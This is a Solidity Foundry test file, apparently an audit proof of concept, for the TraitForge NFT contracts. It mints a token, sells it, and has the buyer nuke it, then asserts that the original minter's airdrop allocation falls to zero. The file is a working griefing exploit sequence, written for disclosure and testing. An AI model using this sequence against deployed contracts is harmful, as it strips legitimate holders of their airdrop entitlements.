// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import 'forge-std/Test.sol';
import { Test, console } from 'forge-std/Test.sol';
import '../../contracts/NukeFund/NukeFund.sol';
import '../../contracts/TraitForgeNft/TraitForgeNft.sol';
import '../../contracts/DevFund/DevFund.sol';
import '../../contracts/Airdrop/Airdrop.sol';
import '../../contracts/EntityForging/EntityForging.sol';
import '../../contracts/EntityTrading/EntityTrading.sol';
import '../../contracts/EntropyGenerator/EntropyGenerator.sol';
import './MerkleData.sol';

contract GreifingAttack is Test {
  address public owner;
  address public user1;
  NukeFund public nukeFund;
  TraitForgeNft public nft;
  DevFund public devFund;
  Airdrop public airdrop;
  EntityForging public entityForging;
  EntityTrading public entityTrading;
  EntropyGenerator public entropyGenerator;
  MerkleData public merkleData;

  bytes32 public rootHash;
  address[] public whitelistAddresses;
  mapping(address => bytes32) public leafNodes;
  mapping(address => bytes32[]) public proofs;

  function setUp() public {
    merkleData = new MerkleData();
    rootHash = merkleData.getRootHash();

    MerkleData.WhitelistEntry[] memory entries = merkleData
      .getWhitelistEntries();
    for (uint i = 0; i < entries.length; i++) {
      whitelistAddresses.push(entries[i].addr);
      leafNodes[entries[i].addr] = entries[i].leaf;
      proofs[entries[i].addr] = entries[i].proof;
    }

    owner = address(0x1);
    user1 = address(0x2);
    vm.startPrank(owner);

    // Deploy TraitForgeNft
    nft = new TraitForgeNft();

    // Deploy and setup DevFund
    devFund = new DevFund();
    devFund.addDev(owner, 1);

    // Deploy and setup Airdrop
    airdrop = new Airdrop();
    nft.setAirdropContract(address(airdrop));
    airdrop.transferOwnership(address(nft));

    // Deploy NukeFund
    nukeFund = new NukeFund(
      address(nft),
      address(airdrop),
      payable(devFund),
      payable(owner)
    );
    nft.setNukeFundContract(payable(address(nukeFund)));

    // Deploy and setup EntropyGenerator
    entropyGenerator = new EntropyGenerator(payable(address(nft)));
    entropyGenerator.writeEntropyBatch1();
    nft.setEntropyGenerator(address(entropyGenerator));

    // Deploy and setup EntityForging
    entityForging = new EntityForging(address(nft));
    nft.setEntityForgingContract(address(entityForging));

    // Setup MerkleTree
    merkleData = new MerkleData();
    nft.setRootHash(merkleData.getRootHash());

    // Deploy and setup EntityTrading
    entityTrading = new EntityTrading(address(nft));
    entityTrading.setNukeFundAddress(payable(nukeFund));
    // Set minimumDaysHeld to 0 for testing purpose
    nukeFund.setMinimumDaysHeld(0);
    vm.stopPrank();
  }

  function testMintSellNukeGriefing() public {
    // Move some variables to storage to reduce stack usage
    address user1 = whitelistAddresses[0]; // Use second whitelisted address
    address user2 = whitelistAddresses[1]; // Use third whitelisted address

    // STEP 1: User1 mints a token
    _mintTokenForUser(user1);

    // Get the token ID of the newly minted token
    uint256 tokenId = nft.tokenOfOwnerByIndex(user1, 0);

    // STEP 2: Track user1's airdrop amount
    uint256 tokenEntropy = nft.getTokenEntropy(tokenId);
    _verifyAirdropAmount(
      user1,
      tokenEntropy,
      'Initial airdrop amount incorrect'
    );

    // STEP 3 & 4: List and sell token
    _listAndSellToken(user1, user2, tokenId);

    // STEP 5: Verify airdrop amounts after sale
    _verifyAirdropAmount(
      user1,
      tokenEntropy,
      "User1's airdrop amount changed after sale"
    );
    _verifyAirdropAmount(user2, 0, 'User2 should have no airdrop amount');

    // STEP 6: User2 nukes the token
    _nukeToken(user2, tokenId);

    // STEP 7: Verify final airdrop amounts
    _verifyFinalAirdropAmounts(user1, user2, tokenEntropy);
  }

  // Helper functions to break up the logic
  function _mintTokenForUser(address user) private {
    uint256 balanceBefore = nft.balanceOf(user);
    vm.startPrank(user);
    vm.deal(user, 1 ether);
    bytes32[] memory userProof = merkleData.getProofForAddress(user);
    nft.mintToken{ value: 1 ether }(userProof);
    assertEq(nft.balanceOf(user), balanceBefore + 1);
    vm.stopPrank();
  }

  function _verifyAirdropAmount(
    address user,
    uint256 expectedAmount,
    string memory message
  ) private {
    uint256 userInfo = airdrop.userInfo(user);
    assertEq(userInfo, expectedAmount, message);
  }

  function _listAndSellToken(
    address seller,
    address buyer,
    uint256 tokenId
  ) private {
    // List token
    vm.startPrank(seller);
    nft.approve(address(entityTrading), tokenId);
    entityTrading.listNFTForSale(tokenId, 1 ether);
    uint256 listingId = entityTrading.listedTokenIds(tokenId);
    (, , , bool isActive) = entityTrading.listings(listingId);
    assertTrue(isActive);
    vm.stopPrank();

    // Buy token
    vm.startPrank(buyer);
    vm.deal(buyer, 1 ether);
    entityTrading.buyNFT{ value: 1 ether }(tokenId);
    (, , , bool isActiveAfterSale) = entityTrading.listings(listingId);
    assertFalse(isActiveAfterSale);
    vm.stopPrank();
  }

  function _nukeToken(address nuker, uint256 tokenId) private {
    vm.startPrank(nuker);
    nft.approve(address(nukeFund), tokenId);
    assertTrue(nukeFund.canTokenBeNuked(tokenId));
    nukeFund.nuke(tokenId);
    vm.stopPrank();
  }

  function _verifyFinalAirdropAmounts(
    address user1,
    address user2,
    uint256 originalEntropy
  ) private {
    uint256 user2Final = airdrop.userInfo(user2);
    uint256 user1Final = airdrop.userInfo(user1);

    assertEq(user2Final, 0, 'User2 should still have no airdrop amount');
    assertNotEq(
      user1Final,
      originalEntropy,
      "User1's airdrop amount should be reduced"
    );
    assertEq(
      user1Final,
      user2Final,
      'Both users should have same (zero) airdrop amount'
    );
  }
}
